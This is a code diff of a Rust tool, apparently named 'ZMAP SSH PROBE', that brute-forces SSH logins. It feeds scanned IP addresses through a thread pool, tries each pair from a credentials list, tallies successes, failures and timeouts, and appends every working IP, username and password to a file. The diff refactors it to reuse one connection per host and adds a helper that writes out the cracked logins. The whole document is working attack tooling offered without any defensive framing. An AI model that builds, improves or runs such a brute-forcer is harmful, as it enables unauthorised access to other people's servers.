@@ -33,20 +33,11 @@ struct Args {
     threads: usize,
 }
 
-struct LoginAttempt {
-    ip: String,
-    username: String,
-    password: String,
-    success: bool,
-}
-
 fn main() {
     let args = Args::parse();
 
     let (ip_tx, ip_rx) = mpsc::channel();
-    let (results_tx, results_rx) = mpsc::channel();
-
-
+   
     thread::spawn(|| {
         println!("+-------------------------------------------+");
         println!("|             ZMAP SSH PROBE                |");
@@ -64,7 +55,7 @@ fn main() {
             let timeouts_count = TIMEOUTS.load(Ordering::Relaxed);
 
             // Clear current line and print updated stats on one line
-            print!("\rIPs Imported: {} | IPs Checked: {} | Combos Checked: {} | Successful: {} | Failed: {} | Timeouts: {} ", 
+            print!("IPs Imported: {} | IPs Checked: {} | Combos Checked: {} | Successful: {} | Failed: {} | Timeouts: {} \n", 
                 imported_count.to_string().blue(),
                 checked_count.to_string().blue(),
                 combos_checked_count.to_string().yellow(), 
@@ -93,11 +84,12 @@ fn main() {
     loop {
         match ip_rx.recv() {
             Ok(ip) => {
-                let results_tx = results_tx.clone();
                 let creds = credentials.clone();
+                let output_file = args.output_file.clone();
+    
                 pool.execute(move || {
-                    check_ssh_login(ip, args.port, creds, results_tx);
-                });                
+                    check_ssh_login(ip, args.port, creds, &output_file);
+                });                                           
             }
             Err(_) => {
                 // Channel is closed, no more IPs
@@ -105,72 +97,51 @@ fn main() {
             }
         }
     }
-
-    //drop(results_tx);  // close the sender, so we can iterate until receiver is empty
-
-    let file = OpenOptions::new()
-        .write(true)
-        .append(true)
-        .create(true)
-        .open(&args.output_file)
-        .unwrap();
-    let mut file = BufWriter::new(file);
-    
-    thread::spawn(move || {
-        for login_attempt in results_rx.iter() {
-            if login_attempt.success {
-                writeln!(file, "IP: {}, Username: {}, Password: {}", 
-                    login_attempt.ip, 
-                    login_attempt.username, 
-                    login_attempt.password).unwrap();
-                file.flush().unwrap(); // Flush the buffer to write to disk immediately
-            }            
-        }
-    });
 }
 
-fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, results: mpsc::Sender<LoginAttempt>) {
+fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
     let timeout = 5_000; // milliseconds
+    CHECKED.fetch_add(1, Ordering::Relaxed);
 
-    for (username, password) in &credentials {
+    if let Ok(tcp_stream) = net::TcpStream::connect((ip.as_str(), port)) {
         let mut session = Session::new().unwrap();
+        session.set_tcp_stream(tcp_stream);
         session.set_timeout(timeout);
 
-        if let Ok(_) = net::TcpStream::connect((ip.as_str(), port)) {
-            match session.handshake() {
-                Ok(_) => {
-                    let auth_success = session.userauth_password(username, password).is_ok();
-                    results.send(LoginAttempt {
-                        ip: ip.clone(),
-                        username: username.clone(),
-                        password: password.clone(),
-                        success: auth_success,
-                    }).unwrap();
-                    session.disconnect(None, "Closing session", None).unwrap();
-
-                    COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
-
-                    if auth_success {
-                        SUCCESS.fetch_add(1, Ordering::Relaxed);
-                        break;  // exit loop if a successful login was found for the IP
-                    } else {
-                        FAILED.fetch_add(1, Ordering::Relaxed);
+        match session.handshake() {
+            Ok(_) => {
+                for (username, password) in &credentials {
+                    match session.userauth_password(username, password) {
+                        Ok(_) => {
+                            session.disconnect(None, "Closing session", None).unwrap();
+                            write_successful_login_to_file(output_file, &ip, username, password);
+                            SUCCESS.fetch_add(1, Ordering::Relaxed);
+                            break;
+                        },
+                        Err(e) => {
+                            if e.to_string().contains("Unable to negotiate") {
+                                // If the error message contains "Unable to negotiate", we treat it as a failed attempt
+                                FAILED.fetch_add(1, Ordering::Relaxed);
+                                break;
+                            } else {
+                                FAILED.fetch_add(1, Ordering::Relaxed);
+                            }
+                        }
                     }
                 }
-                Err(e) => {
-                    if e.to_string().contains("timeout") {
-                        TIMEOUTS.fetch_add(1, Ordering::Relaxed);
-                    } else {
-                        println!("Error during handshake for {}: {:?}", ip, e);
-                        FAILED.fetch_add(1, Ordering::Relaxed);
-                    }
+            },
+
+            Err(e) => {
+                if e.to_string().contains("timeout") {
+                    TIMEOUTS.fetch_add(1, Ordering::Relaxed);
+                } else {
+                    // Handle other errors
+                    FAILED.fetch_add(1, Ordering::Relaxed);
                 }
-            }
-        } else {
-            CHECKED.fetch_add(1, Ordering::Relaxed);
-            FAILED.fetch_add(1, Ordering::Relaxed);
-            break; // If you can't connect to the IP, no point in trying other username/password combinations
+            }            
         }
+    } else {
+        FAILED.fetch_add(1, Ordering::Relaxed);
     }
 }
 
@@ -188,3 +159,17 @@ fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
         }
     }).collect()
 }
+
+fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
+    let file = OpenOptions::new()
+        .write(true)
+        .append(true)
+        .create(true)
+        .open(output_file)
+        .unwrap();
+    let mut file = BufWriter::new(file);
+    
+    writeln!(file, "IP: {}, Username: {}, Password: {}", ip, username, password).unwrap();
+    file.flush().unwrap();
+}
+
